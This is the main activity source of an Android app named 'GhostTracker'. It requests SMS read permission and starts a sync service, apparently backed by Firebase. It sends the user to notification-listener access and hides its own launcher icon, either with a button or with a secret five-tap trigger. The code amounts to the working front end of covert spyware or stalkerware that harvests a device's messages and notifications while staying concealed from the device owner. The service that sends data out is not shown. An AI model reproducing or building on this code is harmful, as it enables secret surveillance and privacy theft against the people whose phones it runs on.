package com.maleezha.ghosttracker;

import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Button;
import android.widget.RelativeLayout;
import android.widget.TextView;
import android.widget.Toast;
import android.widget.ToggleButton;

import androidx.activity.EdgeToEdge;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationManagerCompat;
import androidx.core.content.ContextCompat;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import com.google.firebase.FirebaseApp;
import com.google.firebase.database.DatabaseReference;
import com.maleezha.ghosttracker.services.SyncService;

import java.util.Set;

public class MainActivity extends AppCompatActivity {

    RelativeLayout btnSms,btnHide, btnNotification, btnInvisible;
    private static final int SMS_PERMISSION_CODE = 123;
    private ToggleButton toggleHide;
    private DatabaseReference controlRef;
    private int clickCount = 0;
    private long lastClickTime = 0;
    TextView statusText, hello_title;
    private ToggleButton toggleHide1;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

        btnSms = findViewById(R.id.btnSms);
        btnHide = findViewById(R.id.btnHide);
        btnInvisible = findViewById(R.id.btnInvisible);
        btnNotification = findViewById(R.id.btnNotification);
        statusText = findViewById(R.id.statusText);
        hello_title = findViewById(R.id.hello_title);
        updateStatus();

        btnInvisible.setOnClickListener(v -> {
            long currentTime = System.currentTimeMillis();

            // Reset if more than 2 sec gap
            if (currentTime - lastClickTime > 2000) {
                clickCount = 0;
            }

            clickCount++;
            lastClickTime = currentTime;

            Toast.makeText(this, "Click Count: " + clickCount, Toast.LENGTH_SHORT).show();

            if (clickCount == 5) {
                clickCount = 0;
                Toast.makeText(this, "Secret Action Activated!", Toast.LENGTH_SHORT).show();
                PackageManager pm = getPackageManager();
                pm.setApplicationEnabledSetting(
                        getPackageName(),
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP);
            }
        });

        btnHide.setOnClickListener(v -> {
            PackageManager pm = getPackageManager();
            ComponentName componentName = new ComponentName(
                    getPackageName(),
                    "com.maleezha.ghosttracker.MainActivity"
            );
            pm.setComponentEnabledSetting(
                    componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
            );
            Toast.makeText(this, "App icon hidden!", Toast.LENGTH_SHORT).show();
        });

        btnNotification.setOnClickListener(view -> {
            startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
        });

        btnSms.setOnClickListener(v -> {
            checkSmsPermission();
        });

        if (FirebaseApp.getApps(this).isEmpty()) {
            FirebaseApp.initializeApp(this);
        }
    }
    private void checkSmsPermission() {
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_SMS}, SMS_PERMISSION_CODE);
        } else {
            startSmsSyncService();
        }
    }

    private void startSmsSyncService() {
        Intent intent = new Intent(this, SyncService.class);
        startService(intent);
        Toast.makeText(this, "Sync Service Started", Toast.LENGTH_SHORT).show();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == SMS_PERMISSION_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this, "SMS Permission Granted", Toast.LENGTH_SHORT).show();
                startSmsSyncService();
            } else {
                Toast.makeText(this, "SMS Permission Denied", Toast.LENGTH_LONG).show();
            }
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        // Update status when returning from settings
        updateStatus();
    }

    private void updateStatus() {
        if (isNotificationAccessEnabled()) {
            statusText.setText("✅ GhostTracker - ENABLED");
            statusText.setTextColor(Color.parseColor("#4CAF50"));
        } else {
            statusText.setText("❌ GhostTracker - DISABLED");
            statusText.setTextColor(Color.parseColor("#F44336"));
        }
    }

    private boolean isNotificationAccessEnabled() {
        Set<String> enabledPackages = NotificationManagerCompat.getEnabledListenerPackages(this);
        return enabledPackages.contains(getPackageName());
    }
}
